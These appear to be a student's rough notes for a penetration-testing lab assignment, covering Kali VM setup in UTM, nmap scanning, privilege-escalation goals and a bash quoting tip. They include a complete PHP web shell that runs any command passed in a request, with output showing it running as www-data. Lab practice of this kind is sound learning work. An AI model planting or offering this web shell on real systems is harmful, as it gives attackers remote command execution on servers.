First VM:
Scan ports using nmap, poke on website, see error, .... Or whatever

Don't make root password root. 

Pick a vulnerability. (not super ambitous for this round)

Goal of first assignment: Build VM, make sure environment setup so we can do a VM. 

If I'm able to log in but not as root, if can execute some limited things -- how can I get to root privileges from here. 

First step: able to execute some UNIX commands somehow....




UTM VM,

kali.... .iso (disk img file)

c_d/db points to kali.iso 
considered to be cd to not be writable
cd/dvd-> kaliâ€¦.installer.iso (fix)?


Download installer iso now. need ~1/2 hour


If use ' in bash, deactivates special characters ex. ?
webshell.php:
<?php
    if (isset($_REQUEST['command'])) {
        system($_REQUEST['command']);
    }
?>
</pre>
www-data
</pre>
